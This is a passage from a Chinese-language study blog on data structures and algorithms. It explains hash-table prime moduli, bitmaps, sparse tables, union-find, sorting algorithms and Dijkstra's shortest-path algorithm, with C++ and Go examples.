<li><a href="/blogs/2018-07-06-CppStudy/#bigHeap">C++标准库有接口可以直接应用</a></li>
</ul>
<h4 id="4-红黑树"><a href="#4-红黑树" class="headerlink" title="4) 红黑树"></a>4) 红黑树</h4><p>参考 <a href="https://zhuanlan.zhihu.com/p/78152265">红黑树(R-B tree)原理图文详解</a></p>
<h5 id="1-红黑树的特性和应用"><a href="#1-红黑树的特性和应用" class="headerlink" title="(1) 红黑树的特性和应用"></a>(1) 红黑树的特性和应用</h5><ul>
<li>红黑树的查找和插入时间复杂度都是 $O(\log n)$，相比hash表更加稳定</li>
</ul>
<p><strong>应用</strong></p>
<ul>
<li>std::map和std::set使用的是红黑树</li>
<li>epoll的底层实现是用红黑树组织fd</li>
</ul>
<h2 id="2-hashTable-哈希表"><a href="#2-hashTable-哈希表" class="headerlink" title="2. hashTable 哈希表"></a>2. hashTable 哈希表</h2><h3 id="2-1-为什么哈希表的除数要用素数"><a href="#2-1-为什么哈希表的除数要用素数" class="headerlink" title="2.1. 为什么哈希表的除数要用素数"></a>2.1. 为什么哈希表的除数要用素数</h3><p>参考自 <a href="https://blog.csdn.net/w_y_x_y/article/details/82288178">腾讯面试真题：证明为什么哈希表除m取余法的被除数为什么用素数比较好</a></p>
<ul>
<li>使用合数可能和等差数列的差值含有公因数，导致碰撞概率增大</li>
</ul>
<h4 id="1-假设"><a href="#1-假设" class="headerlink" title="1) 假设"></a>1) 假设</h4><ul>
<li>传入的key是等差数列: 首项1，差值从2到5，长度10</li>
<li>两个hash表，一个使用6取模，一个使用7取模</li>
</ul>
<h4 id="2-效果"><a href="#2-效果" class="headerlink" title="2) 效果"></a>2) 效果</h4><p><strong>差值2</strong></p>
<table>
<thead>
<tr>
<th>余数</th>
<th>0</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
</tr>
</thead>
<tbody><tr>
<td>首次</td>
<td></td>
<td>1</td>
<td></td>
<td>3</td>
<td></td>
<td>5</td>
</tr>
<tr>
<td>碰撞</td>
<td></td>
<td>7</td>
<td></td>
<td>9</td>
<td></td>
<td>11</td>
</tr>
<tr>
<td>碰撞</td>
<td></td>
<td>13</td>
<td></td>
<td>15</td>
<td></td>
<td>17</td>
</tr>
<tr>
<td>碰撞</td>
<td></td>
<td>19</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>余数</th>
<th>0</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
<th>6</th>
</tr>
</thead>
<tbody><tr>
<td>首次</td>
<td>7</td>
<td>1</td>
<td>9</td>
<td>3</td>
<td>11</td>
<td>5</td>
<td>13</td>
</tr>
<tr>
<td>碰撞</td>
<td></td>
<td>15</td>
<td></td>
<td>17</td>
<td></td>
<td>19</td>
<td></td>
</tr>
</tbody></table>
<p><strong>差值3</strong></p>
<table>
<thead>
<tr>
<th>余数</th>
<th>0</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
</tr>
</thead>
<tbody><tr>
<td>首次</td>
<td></td>
<td>1</td>
<td></td>
<td></td>
<td>4</td>
<td></td>
</tr>
<tr>
<td>碰撞</td>
<td></td>
<td>7</td>
<td></td>
<td></td>
<td>10</td>
<td></td>
</tr>
<tr>
<td>碰撞</td>
<td></td>
<td>13</td>
<td></td>
<td></td>
<td>16</td>
<td></td>
</tr>
<tr>
<td>碰撞</td>
<td></td>
<td>19</td>
<td></td>
<td></td>
<td>22</td>
<td></td>
</tr>
<tr>
<td>碰撞</td>
<td></td>
<td>25</td>
<td></td>
<td></td>
<td>28</td>
<td></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>余数</th>
<th>0</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
<th>6</th>
</tr>
</thead>
<tbody><tr>
<td>首次</td>
<td>7</td>
<td>1</td>
<td>16</td>
<td>10</td>
<td>4</td>
<td>19</td>
<td>13</td>
</tr>
<tr>
<td>碰撞</td>
<td>28</td>
<td>22</td>
<td></td>
<td></td>
<td>25</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><strong>差值4</strong></p>
<table>
<thead>
<tr>
<th>余数</th>
<th>0</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
</tr>
</thead>
<tbody><tr>
<td>首次</td>
<td></td>
<td>1</td>
<td></td>
<td>9</td>
<td></td>
<td>5</td>
</tr>
<tr>
<td>碰撞</td>
<td></td>
<td>13</td>
<td></td>
<td>21</td>
<td></td>
<td>17</td>
</tr>
<tr>
<td>碰撞</td>
<td></td>
<td>25</td>
<td></td>
<td>33</td>
<td></td>
<td>29</td>
</tr>
<tr>
<td>碰撞</td>
<td></td>
<td>37</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>余数</th>
<th>0</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
<th>6</th>
</tr>
</thead>
<tbody><tr>
<td>首次</td>
<td>21</td>
<td>1</td>
<td>9</td>
<td>17</td>
<td>25</td>
<td>5</td>
<td>13</td>
</tr>
<tr>
<td>碰撞</td>
<td></td>
<td>29</td>
<td>37</td>
<td></td>
<td></td>
<td>33</td>
<td></td>
</tr>
</tbody></table>
<p><strong>差值5</strong></p>
<table>
<thead>
<tr>
<th>余数</th>
<th>0</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
</tr>
</thead>
<tbody><tr>
<td>首次</td>
<td>6</td>
<td>1</td>
<td>26</td>
<td>21</td>
<td>16</td>
<td>11</td>
</tr>
<tr>
<td>碰撞</td>
<td>36</td>
<td>31</td>
<td></td>
<td></td>
<td>46</td>
<td>41</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>余数</th>
<th>0</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
<th>6</th>
</tr>
</thead>
<tbody><tr>
<td>首次</td>
<td>21</td>
<td>1</td>
<td>16</td>
<td>31</td>
<td>11</td>
<td>26</td>
<td>6</td>
</tr>
<tr>
<td>碰撞</td>
<td></td>
<td>36</td>
<td></td>
<td></td>
<td>46</td>
<td></td>
<td>41</td>
</tr>
</tbody></table>
<h4 id="3-结论"><a href="#3-结论" class="headerlink" title="3) 结论"></a>3) 结论</h4><ul>
<li>如果差值和被除数之间不含有公因数，效果一样</li>
<li>如果含有公因数，碰撞概率会变高</li>
</ul>
<h2 id="3-bitmap-位图"><a href="#3-bitmap-位图" class="headerlink" title="3. bitmap 位图"></a>3. bitmap 位图</h2><h3 id="3-1-原理"><a href="#3-1-原理" class="headerlink" title="3.1. 原理"></a>3.1. 原理</h3><ul>
<li>一个int表示32位，可以表示32个数字，即</li>
</ul>
<table>
<thead>
<tr>
<th>0</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>…</th>
<th>31</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0</td>
<td>1</td>
<td>0</td>
<td>…</td>
<td>1</td>
</tr>
</tbody></table>
<ul>
<li>代表2和31都在集合中</li>
<li>按照在二进制中的位置表示对应的数字</li>
<li>使用数组可以将一个很大的内存区域集合在一起，根据对应的位置说明对应的数字</li>
</ul>
<h3 id="3-2-举例"><a href="#3-2-举例" class="headerlink" title="3.2. 举例"></a>3.2. 举例</h3><ul>
<li>对一大批不同的11位qq号进行排序</li>
</ul>
<h4 id="1-实现"><a href="#1-实现" class="headerlink" title="1) 实现"></a>1) 实现</h4><ul>
<li>11位qq号最大99999999999，也就是需要 $1 \times 10^{12}$ 个bit保存</li>
<li>计算成int数组 $1 \times 10^{12} &#x2F; 32 &#x3D; 31250000000$</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_QQ_NUMBER 99999999ll</span></span><br><span class="line"><span class="type">const</span> <span class="type">long</span> BITS_PER_LONG = <span class="number">8</span> * <span class="built_in">sizeof</span>(<span class="type">long</span>);</span><br><span class="line"><span class="type">long</span> qq_bitmap[MAX_QQ_NUMBER / BITS_PER_LONG + <span class="number">1</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">set_qq_bitmap</span><span class="params">(<span class="type">long</span> <span class="type">long</span> qq)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (qq &gt; MAX_QQ_NUMBER) <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// 假设32位，long为32位</span></span><br><span class="line">    <span class="comment">// 先将输入的qq按照32一组找到对应的位置，然后将在其在32个一组中的位置置1</span></span><br><span class="line">    <span class="comment">// 61 =&gt; qq_bitmap[1] |= (1 &lt;&lt; 29)</span></span><br><span class="line">    qq_bitmap[qq / BITS_PER_LONG] |= (<span class="number">1</span> &lt;&lt; (qq % BITS_PER_LONG));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="title">check_qq_bitmap</span><span class="params">(<span class="type">long</span> <span class="type">long</span> qq)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (qq &gt; MAX_QQ_NUMBER) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 同理，找到qq按照32个一组的位置，检查对应的32个数字中的位置是否为1</span></span><br><span class="line">    <span class="keyword">return</span> qq_bitmap[qq / BITS_PER_LONG] &amp; (<span class="number">1</span> &lt;&lt; (qq % BITS_PER_LONG));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4-ST-稀疏表"><a href="#4-ST-稀疏表" class="headerlink" title="4. ST 稀疏表"></a>4. ST 稀疏表</h2><h3 id="4-1-原理"><a href="#4-1-原理" class="headerlink" title="4.1. 原理"></a>4.1. 原理</h3><ul>
<li>本身是解决区间问题，也就是给一个序列，找到<code>a-b</code>之间的最大值（或者其他值）为x的有几组</li>
<li>这种题目暴力解决，需要先计算所有两个点之间的最大值存到一个 $n \times n$ 的表里面，然后遍历表进行统计，空间复杂度和时间复杂度太高</li>
<li>使用稀疏表可以使用比较少的空间并节省大量的计算，用到的矩阵大小是 $n \times log_2 n$</li>
<li>首次对数据进行预处理形成一个稀疏表后，可以直接进行 $O(1)$ 的查询</li>
<li>整理成的矩阵的每个元素代表（拿取最大值表示）</li>
</ul>
<p>$$<br>st[j][i] &#x3D; \max \limits_{j \le x \le j + 2^{i}-1} arr[x]<br>$$</p>
<ul>
<li>想要取a到b之间的结果，那么取 $s &#x3D; log_2(b-a+1)$</li>
</ul>
<p>$$<br>f(a, b) &#x3D; \max(st[a][s], st[b-2^{s}+1][s])<br>$$</p>
<ul>
<li>其中 $a + 2^{s}-1 &#x3D; a + (b - a + 1) - 1 &#x3D; b \ge a &#x3D; b - (b - a + 1) + 1 &#x3D; b - 2^{s} + 1$</li>
</ul>
<h2 id="5-并查集"><a href="#5-并查集" class="headerlink" title="5. 并查集"></a>5. 并查集</h2><h3 id="5-1-原理"><a href="#5-1-原理" class="headerlink" title="5.1. 原理"></a>5.1. 原理</h3><ul>
<li>找关系，给一系列点，给出一些点和点的关系。然后找出某两个点是否有关系</li>
<li>单一一个可以直接使用bfs解就好了，如果空间不足，使用并查集可以做到 $O(n)$ 的空间复杂度</li>
<li>首先将所有点初始化关系只有自己和自己</li>
<li>然后遍历一边关系列表，将点和点连接起来，找到公共的父级</li>
<li>查找时就是看是否两个点存在公共父级</li>
</ul>
<h3 id="5-2-实现"><a href="#5-2-实现" class="headerlink" title="5.2. 实现"></a>5.2. 实现</h3><ul>
<li>主要实现两个方法，查找和插入</li>
<li>由于查找要用递归，想要减少递归深度，每次查找，整条链上的所有节点的父级都要指向最终点，这样下次只有一级查找</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 函数外模板</span></span><br><span class="line"><span class="keyword">type</span> unionFind []<span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">initUnionFind</span><span class="params">(n <span class="type">int</span>)</span></span> unionFind &#123;</span><br><span class="line">	u := <span class="built_in">make</span>(unionFind, n)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="keyword">range</span> u &#123;</span><br><span class="line">		u[i] = i</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> u</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u unionFind)</span></span> find(a <span class="type">int</span>) <span class="type">int</span> &#123;</span><br><span class="line">	ap := u[a]</span><br><span class="line">	<span class="comment">// 找到最终节点</span></span><br><span class="line">	<span class="keyword">for</span> ap != u[ap] &#123;</span><br><span class="line">		ap = u[ap]</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 沿途都赋值最终节点</span></span><br><span class="line">	<span class="keyword">for</span> a != ap &#123;</span><br><span class="line">		u[a], a = ap, u[a]</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ap</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 把a的子集合并到b上，如果b是树根节点，a的所有子节点查找都会查找到b</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u unionFind)</span></span> merge(a, b <span class="type">int</span>) &#123;</span><br><span class="line">	u[u.find(b)] = u.find(a)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>函数内并查集模板</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 并查集模板</span></span><br><span class="line">	uf := <span class="built_in">make</span>([]<span class="type">int</span>, n)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="keyword">range</span> uf &#123;</span><br><span class="line">		uf[i] = i</span><br><span class="line">	&#125;</span><br><span class="line">	find := <span class="function"><span class="keyword">func</span><span class="params">(x <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">		ap := uf[x]</span><br><span class="line">		<span class="comment">// 找到最终节点</span></span><br><span class="line">		<span class="keyword">for</span> ap != uf[ap] &#123;</span><br><span class="line">			ap = uf[ap]</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 沿途都赋值最终节点</span></span><br><span class="line">		<span class="keyword">for</span> x != ap &#123;</span><br><span class="line">			uf[x], x = ap, uf[x]</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> ap</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 把a的子集合并到b上，如果b是树根节点，a的所有子节点查找都会查找到b</span></span><br><span class="line">	merge := <span class="function"><span class="keyword">func</span><span class="params">(a, b <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">		uf[find(a)] = find(b)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="四、算法"><a href="#四、算法" class="headerlink" title="四、算法"></a>四、算法</h1><h2 id="1-排序算法"><a href="#1-排序算法" class="headerlink" title="1. 排序算法"></a>1. 排序算法</h2><h3 id="时间复杂度总结"><a href="#时间复杂度总结" class="headerlink" title="时间复杂度总结"></a>时间复杂度总结</h3><img src = "2018_09_26_01.jpg" width = "80%" />

<h4 id="定理"><a href="#定理" class="headerlink" title="定理"></a>定理</h4><ul>
<li>$N$个互异数的数组的平均逆序数是 $N(N-1)&#x2F;4$ 。</li>
<li>通过交换相邻元素进行排序的任何算法平均需要 $\Omega(N^2)$ 时间。</li>
</ul>
<h3 id="1-1-插入排序"><a href="#1-1-插入排序" class="headerlink" title="1.1. 插入排序"></a>1.1. 插入排序</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><ul>
<li>自我理解像扑克牌起牌一样，一张一张插入到已有的序列中</li>
</ul>
<img src = "2018_09_26_02.gif" width = "80%" />

<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @function 用插入排序数组</span></span><br><span class="line"><span class="comment"> * @param data 数组首地址</span></span><br><span class="line"><span class="comment"> * @param length 数组长度</span></span><br><span class="line"><span class="comment"> * @param order 排列顺序：顺序，true；倒序，false</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insertionSort</span><span class="params">(T *data, <span class="type">int</span> length, <span class="type">bool</span> order = <span class="literal">true</span>)</span> </span>&#123;</span><br><span class="line">    T tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; length; ++i) &#123;</span><br><span class="line">        tmp = data[i];</span><br><span class="line">        <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (j = i; j &gt; <span class="number">0</span> &amp;&amp; ((data[j - <span class="number">1</span>] &gt; tmp) ^ !order); --j) &#123;</span><br><span class="line">            data[j] = data[j - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        data[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-希尔排序"><a href="#1-2-希尔排序" class="headerlink" title="1.2. 希尔排序"></a>1.2. 希尔排序</h3><ul>
<li>带间隔的插入排序</li>
</ul>
<img src = "2018_09_26_03.gif" width = "80%" />

<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @function 用希尔增量的希尔排序数组</span></span><br><span class="line"><span class="comment"> * @param data 数组首地址</span></span><br><span class="line"><span class="comment"> * @param length 数组长度</span></span><br><span class="line"><span class="comment"> * @param order 排列顺序：顺序，true；倒序，false</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shellSort</span><span class="params">(T *data, <span class="type">int</span> length, <span class="type">bool</span> order = <span class="literal">true</span>)</span> </span>&#123;</span><br><span class="line">    T tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> increment = length / <span class="number">2</span>; increment &gt; <span class="number">0</span>; increment /= <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = increment; i &lt; length; ++i) &#123;</span><br><span class="line">            tmp = data[i];</span><br><span class="line">            <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (j = i; j &gt;= increment &amp;&amp; ((data[j - increment] &gt; tmp) ^ !order); j -= increment) &#123;</span><br><span class="line">                data[j] = data[j - increment];</span><br><span class="line">            &#125;</span><br><span class="line">            data[j] = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="定理-1"><a href="#定理-1" class="headerlink" title="定理"></a>定理</h4><ul>
<li>使用希尔增量时希尔排序的最坏情形的运行时间为 $\Theta(N^2)$ 。</li>
<li>使用Hibbard增量的希尔排序的最坏情形运行时间为 $\Theta(N^{\frac{3}{2}})$</li>
</ul>
<h3 id="1-3-堆排序"><a href="#1-3-堆排序" class="headerlink" title="1.3. 堆排序"></a>1.3. 堆排序</h3><img src = "2018_09_26_04.gif" width = "80%" />

<ul>
<li>大根堆或小根堆，保证父节点一定大于（小于）子节点，头节点为最大（最小）的</li>
</ul>
<h3 id="1-4-快速排序（分治思想）"><a href="#1-4-快速排序（分治思想）" class="headerlink" title="1.4. 快速排序（分治思想）"></a>1.4. 快速排序（分治思想）</h3><img src = "2021_03_26_01.gif" width = "80%" />

<ul>
<li>选定一个中轴数，将数组分为大于和小于的部分，中轴放中间</li>
<li>对大于部分和小于部分分别做同样的事</li>
</ul>
<h2 id="2-最短路径算法"><a href="#2-最短路径算法" class="headerlink" title="2. 最短路径算法"></a>2. 最短路径算法</h2><h3 id="Dijkstra-迪杰斯特拉-算法"><a href="#Dijkstra-迪杰斯特拉-算法" class="headerlink" title="Dijkstra(迪杰斯特拉)算法"></a>Dijkstra(迪杰斯特拉)算法</h3><p>Dijkstra(迪杰斯特拉)算法是典型的单源最短路径算法，用于计算一个节点到某个节点的最短路径。主要特点是以起始点为中心向外层层扩展，直到扩展到终点为止。</p>
<h4 id="算法描述"><a href="#算法描述" class="headerlink" title="算法描述"></a>算法描述</h4><img src = "2019_02_23_08.png" width = "40%">

<img src = "2019_02_23_09.png" width = "80%">

<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> pointS <span class="keyword">struct</span> &#123;</span><br><span class="line">	ch   <span class="type">byte</span></span><br><span class="line">	step <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> littleQueue []pointS</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(q *littleQueue)</span></span> Push(v <span class="keyword">interface</span>&#123;&#125;) &#123;</span><br><span class="line">	*q = <span class="built_in">append</span>(*q, v.(pointS))</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(q *littleQueue)</span></span> Pop() <span class="keyword">interface</span>&#123;&#125; &#123;</span><br><span class="line">	x := (*q)[<span class="built_in">len</span>(*q)<span class="number">-1</span>]</span><br><span class="line">	*q = (*q)[:<span class="built_in">len</span>(*q)<span class="number">-1</span>]</span><br><span class="line">	<span class="keyword">return</span> x</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(q *littleQueue)</span></span> Len() <span class="type">int</span>           &#123; <span class="keyword">return</span> <span class="built_in">len</span>(*q) &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(q *littleQueue)</span></span> Less(i, j <span class="type">int</span>) <span class="type">bool</span> &#123; <span class="keyword">return</span> (*q)[i].step &lt; (*q)[j].step &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(q *littleQueue)</span></span> Swap(i, j <span class="type">int</span>)      &#123; (*q)[i], (*q)[j] = (*q)[j], (*q)[i] &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">dijkstra</span><span class="params">(src <span class="type">byte</span>, dst <span class="type">byte</span>, distMaps <span class="keyword">map</span>[<span class="type">byte</span>]<span class="keyword">map</span>[<span class="type">byte</span>]<span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">	<span class="comment">// 定义小根堆，主要为了每次取最小的一个距离进行扩展</span></span><br><span class="line">	pq := <span class="built_in">make</span>(littleQueue, <span class="number">1</span>)</span><br><span class="line">	<span class="comment">// 把起点插入</span></span><br><span class="line">	pq[<span class="number">0</span>] = pointS&#123;src, <span class="number">0</span>&#125;</span><br><span class="line">	heap.Init(&amp;pq)</span><br><span class="line">	<span class="comment">// 记录一下从起点到某一个点的最小距离</span></span><br><span class="line">	finalDistMap := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">byte</span>]<span class="type">int</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> pq.Len() &gt; <span class="number">0</span> &#123;</span><br><span class="line">		<span class="comment">// 取头部当前已走的最小距离的点进行拓展</span></span><br><span class="line">		t := heap.Pop(&amp;pq).(pointS)</span><br><span class="line">		<span class="comment">// 如果当前是目的地址，那么步数就是最小的</span></span><br><span class="line">		<span class="comment">// 反证一下，假设存在一个更小的，那么肯定还没到目的点，如果到了，前面会插入到小根堆中，这次就不会取到大的</span></span><br><span class="line">		<span class="comment">//          如果没到，还得再走，距离会是那个点继续加，那么就不可能比当前更小</span></span><br><span class="line">		<span class="keyword">if</span> t.ch == dst &#123;</span><br><span class="line">			<span class="keyword">return</span> t.step</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 从此点向外走，获取此点能到的最近的点的距离</span></span><br><span class="line">		distMap := distMaps[t.ch]</span><br><span class="line">		<span class="keyword">for</span> i, v := <span class="keyword">range</span> distMap &#123;</span><br><span class="line">			<span class="comment">// 从起点到t再走到i的距离</span></span><br><span class="line">			step := t.step + v</span><br><span class="line">			<span class="comment">// 如果记录的到i点距离更小，这个点就不走了，因为之前记录那一次走过了</span></span><br><span class="line">			<span class="keyword">if</span> d, ok := finalDistMap[i]; ok &amp;&amp; d &lt;= step &#123;</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			&#125;</span><br><span class="line">			finalDistMap[i] = step</span><br><span class="line">			heap.Push(&amp;pq, pointS&#123;i, step&#125;)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 定义好距离矩阵</span></span><br><span class="line">	distMaps := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">byte</span>]<span class="keyword">map</span>[<span class="type">byte</span>]<span class="type">int</span>)</span><br><span class="line">	distMaps[<span class="string">&#x27;A&#x27;</span>] = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">byte</span>]<span class="type">int</span>)</span><br><span class="line">	distMaps[<span class="string">&#x27;A&#x27;</span>][<span class="string">&#x27;B&#x27;</span>] = <span class="number">6</span></span><br><span class="line">	distMaps[<span class="string">&#x27;A&#x27;</span>][<span class="string">&#x27;C&#x27;</span>] = <span class="number">3</span></span><br><span class="line">	distMaps[<span class="string">&#x27;B&#x27;</span>] = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">byte</span>]<span class="type">int</span>)</span><br><span class="line">	distMaps[<span class="string">&#x27;B&#x27;</span>][<span class="string">&#x27;A&#x27;</span>] = <span class="number">6</span></span><br><span class="line">	distMaps[<span class="string">&#x27;B&#x27;</span>][<span class="string">&#x27;C&#x27;</span>] = <span class="number">2</span></span><br><span class="line">	distMaps[<span class="string">&#x27;B&#x27;</span>][<span class="string">&#x27;D&#x27;</span>] = <span class="number">5</span></span><br><span class="line">	distMaps[<span class="string">&#x27;C&#x27;</span>] = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">byte</span>]<span class="type">int</span>)</span><br><span class="line">	distMaps[<span class="string">&#x27;C&#x27;</span>][<span class="string">&#x27;A&#x27;</span>] = <span class="number">3</span></span><br><span class="line">	distMaps[<span class="string">&#x27;C&#x27;</span>][<span class="string">&#x27;B&#x27;</span>] = <span class="number">2</span></span><br><span class="line">	distMaps[<span class="string">&#x27;C&#x27;</span>][<span class="string">&#x27;D&#x27;</span>] = <span class="number">3</span></span><br><span class="line">	distMaps[<span class="string">&#x27;C&#x27;</span>][<span class="string">&#x27;E&#x27;</span>] = <span class="number">4</span></span><br><span class="line">	distMaps[<span class="string">&#x27;D&#x27;</span>] = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">byte</span>]<span class="type">int</span>)</span><br><span class="line">	distMaps[<span class="string">&#x27;D&#x27;</span>][<span class="string">&#x27;B&#x27;</span>] = <span class="number">5</span></span><br><span class="line">	distMaps[<span class="string">&#x27;D&#x27;</span>][<span class="string">&#x27;C&#x27;</span>] = <span class="number">3</span></span><br><span class="line">	distMaps[<span class="string">&#x27;D&#x27;</span>][<span class="string">&#x27;E&#x27;</span>] = <span class="number">2</span></span><br><span class="line">	distMaps[<span class="string">&#x27;D&#x27;</span>][<span class="string">&#x27;F&#x27;</span>] = <span class="number">3</span></span><br><span class="line">	distMaps[<span class="string">&#x27;E&#x27;</span>] = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">byte</span>]<span class="type">int</span>)</span><br><span class="line">	distMaps[<span class="string">&#x27;E&#x27;</span>][<span class="string">&#x27;C&#x27;</span>] = <span class="number">4</span></span><br><span class="line">	distMaps[<span class="string">&#x27;E&#x27;</span>][<span class="string">&#x27;D&#x27;</span>] = <span class="number">2</span></span><br><span class="line">	distMaps[<span class="string">&#x27;E&#x27;</span>][<span class="string">&#x27;F&#x27;</span>] = <span class="number">5</span></span><br><span class="line">	distMaps[<span class="string">&#x27;F&#x27;</span>] = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">byte</span>]<span class="type">int</span>)</span><br><span class="line">	distMaps[<span class="string">&#x27;F&#x27;</span>][<span class="string">&#x27;D&#x27;</span>] = <span class="number">3</span></span><br><span class="line">	distMaps[<span class="string">&#x27;F&#x27;</span>][<span class="string">&#x27;E&#x27;</span>] = <span class="number">5</span></span><br><span class="line">	<span class="comment">// A =&gt; F 最短路径为 A =&gt; C =&gt; D =&gt; F = 9</span></span><br><span class="line">	fmt.Println(dijkstra(<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, distMaps))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Floyd算法"><a href="#Floyd算法" class="headerlink" title="Floyd算法"></a>Floyd算法</h3><p>Floyd-Warshall算法（Floyd-Warshall algorithm）是解决任意两点间的最短路径的一种算法，可以正确处理有向图或负权的最短路径问题，同时也被用于计算有向图的传递闭包。Floyd-Warshall算法的时间复杂度为O(N3)，空间复杂度为O(N2)。</p>
